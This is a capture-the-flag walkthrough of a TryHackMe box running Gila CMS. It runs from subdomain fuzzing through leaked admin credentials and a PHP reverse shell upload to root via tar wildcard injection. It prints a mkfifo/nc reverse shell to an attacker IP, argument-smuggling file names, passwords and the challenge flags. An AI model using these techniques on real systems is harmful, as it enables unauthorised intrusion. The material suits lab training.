# CMesS

Can you root this Gila CMS box?

Please add `10.10.38.29 cmess.thm` to `/etc/hosts`

Please also note that this box does not require brute forcing!

# #1 - Compromise this machine and obtain user.txt

*Hint: Have you tried fuzzing for subdomains?*

First thing is to add `10.10.38.29 cmess.thm` in our `/etc/hosts` file.

Nmap reveals that 2 ports are open on the target: SSH and HTTP, on their standard ports.

~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
|_  256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Gila CMS
| http-robots.txt: 3 disallowed entries 
|_/src/ /themes/ /lib/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

There is a `robots.txt` file that reveals some hidden locations:

~~~
unknown@localhost:/data/documents/challenges/TryHackMe$ curl -s 10.10.38.29/robots.txt
User-agent: *
Disallow: /src/
Disallow: /themes/
Disallow: /lib/
~~~

When browsing the home page, it reveals that the website is built upon `GilaCMS` (https://gilacms.com/). `dirsearch` discovers several other hidden locations:

~~~
$ /data/src/dirsearch/dirsearch.py -u http://cmess.thm/ -E -w /data/src/wordlists/directory-list-2.3-medium.txt 

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, js, html, do, action | HTTP method: get | Threads: 10 | Wordlist size: 220529

Error Log: /data/src/dirsearch/logs/errors-20-06-18_18-54-00.log

Target: http://cmess.thm/

[18:54:00] Starting: 
[18:54:01] 200 -    4KB - /index
[18:54:01] 200 -    4KB - /
[18:54:01] 200 -    3KB - /about
[18:54:01] 200 -    4KB - /search
[18:54:01] 200 -    4KB - /blog
[18:54:01] 200 -    4KB - /1
[18:54:02] 200 -    4KB - /01
[18:54:02] 200 -    2KB - /login
[18:54:02] 200 -    4KB - /category
[18:54:02] 200 -    4KB - /0
[18:54:02] 200 -  735B  - /feed
[18:54:02] 301 -  318B  - /themes  ->  http://cmess.thm/themes/?url=themes
[18:54:03] 200 -    2KB - /admin
[18:54:04] 301 -  318B  - /assets  ->  http://cmess.thm/assets/?url=assets
[18:54:04] 403 -  274B  - /.hta
[18:54:05] 200 -    4KB - /tag
[18:54:05] 200 -    4KB - /author
[18:54:05] 200 -    4KB - /Search
[18:54:05] 301 -  316B  - /sites  ->  http://cmess.thm/sites/?url=sites
[18:54:06] 200 -    3KB - /About
[18:54:06] 301 -  312B  - /log  ->  http://cmess.thm/log/?url=log
[18:54:07] 200 -    4KB - /Index
[18:54:07] 200 -    3KB - /tags
[18:54:07] 200 -    4KB - /1x1
[18:54:07] 301 -  312B  - /lib  ->  http://cmess.thm/lib/?url=lib
[18:54:08] 301 -  312B  - /src  ->  http://cmess.thm/src/?url=src
[18:54:10] 200 -    0B  - /api
[18:54:15] 200 -    4KB - /001
[18:54:17] 500 -    0B  - /cm
[18:54:22] 200 -    4KB - /1pix
[18:54:24] 200 -    0B  - /fm
[18:54:24] 301 -  312B  - /tmp  ->  http://cmess.thm/tmp/?url=tmp
[18:54:26] 200 -    4KB - /1a
[18:54:32] 200 -    4KB - /0001
[18:54:34] 200 -    4KB - /1x1transparent
[18:54:38] 200 -    4KB - /INDEX
[18:54:39] 200 -    4KB - /1px
[18:54:59] 200 -    4KB - /1d
[18:55:03] 200 -    4KB - /1_1
[18:55:17] 200 -    4KB - /Author
[REDACTED]
~~~

The most interesting locations are probably `/login` and `/admin`, but we don't have credentials, and are instructed not to brute force the autentication.

The hint though recommends to check subdomains; let's use `wfuzz` for that purpose:

~~~
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm" -H "Host: FUZZ.cmess.thm" --hw 290

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://cmess.thm/
Total requests: 4997

===================================================================
ID           Response   Lines    Word     Chars       Payload                                             
===================================================================

000000019:   200        30 L     104 W    934 Ch      "dev"                                               

Total time: 68.70782
Processed Requests: 4997
Filtered Requests: 4996
Requests/sec.: 72.72825
~~~

We have discovered a hidden `dev.cmess.thm` subdomain. Let's add it to our `/etc/hosts` file:

~~~
$ cat /etc/hosts
[REDACTED]
10.10.38.29 cmess.thm
10.10.38.29 dev.cmess.thm
~~~

Now, let's see what we can get from this subdomain:

~~~
$ curl -s dev.cmess.thm | html2text
***** Development Log *****
**** andre@cmess.thm ****
Have you guys fixed the bug that was found on live?

**** support@cmess.thm ****
Hey Andre, We have managed to fix the misconfigured .htaccess file, we're
hoping to patch it in the upcoming patch!

**** support@cmess.thm ****
Update! We have had to delay the patch due to unforeseen circumstances

**** andre@cmess.thm ****
That's ok, can you guys reset my password if you get a moment, I seem to be
unable to get onto the admin panel.

**** support@cmess.thm ****
Your password has been reset. Here: KPFTN_f2yxe%
~~~

We are provided with an email address and a password. Now you can log in:

* URL: http://cmess.thm/admin/
* Email: `andre@cmess.thm`
* Password: `KPFTN_f2yxe%`

Once logged in, go to `Content > File Manager`.

Now, downlaod a PHP shell (http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz), add a file named `shell.php` in the `assets` directory and put the content of the PHP reverse shell (don't forget to modify your IP and port).

Open a listener on your machine (`rlwrap nc -nlvp 4444`), on the port you selected, and browse http://cmess.thm/assets/shell.php. You should now be logged in as `www-data`.

## Lateral move to Andre

If you list the `/home` folder, you'll notice that `andre` is a user. Let's try a lateral move. After searching a bit (you can use `linenum` or `linpeas` to help), you'll notice that Andre's password has been backup'ed in a hidden file under the `/opt` directory:

~~~
www-data@cmess:/opt$ cat /opt/.password.bak
cat /opt/.password.bak
andres backup password
UQfsdCB7aAP6
www-data@cmess:/opt$ 
~~~

Connect to SSH with `andre:UQfsdCB7aAP6` and get the user flag.

~~~
andre@cmess:~$ cat user.txt 
thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}
~~~

User flag: `thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}`

# #2 - Escalate your privileges and obtain root.txt    

Now, let's get `root`. There is an interesting crontab job running every 2 minutes, executed by `root`:

~~~
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
~~~

As you can see, this command is using the wildcard (`*`) to select all files located under `/home/andre/backup` and compress them with `tar`. Having a look at GTFOBins (https://gtfobins.github.io/gtfobins/tar/) tells us that we can take advantage from this mistake.

Indeed, because of the wildcard, we can create files that will be interpreted as options for the `tar` command, to ultimately execute something similar to this:

~~~
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
~~~

Let's do it:

~~~
$ cat > /home/andre/backup/rev << EOF
#!/bin/bash
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.54 4444 >/tmp/f
EOF
$ echo "" > "/home/andre/backup/--checkpoint=1"
$ echo "" > "/home/andre/backup/--checkpoint-action=exec=sh rev"
~~~

Now, let's open a listener and wait for the next batch.

~~~
$ rlwrap nc -nlvp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.185.45.
Ncat: Connection from 10.10.185.45:52344.
/bin/sh: 0: can't access tty; job control turned off
# cat /root/root.txt
thm{9f85b7fdeb2cf96985bf5761a93546a2}
~~~

Root flag: `thm{9f85b7fdeb2cf96985bf5761a93546a2}`
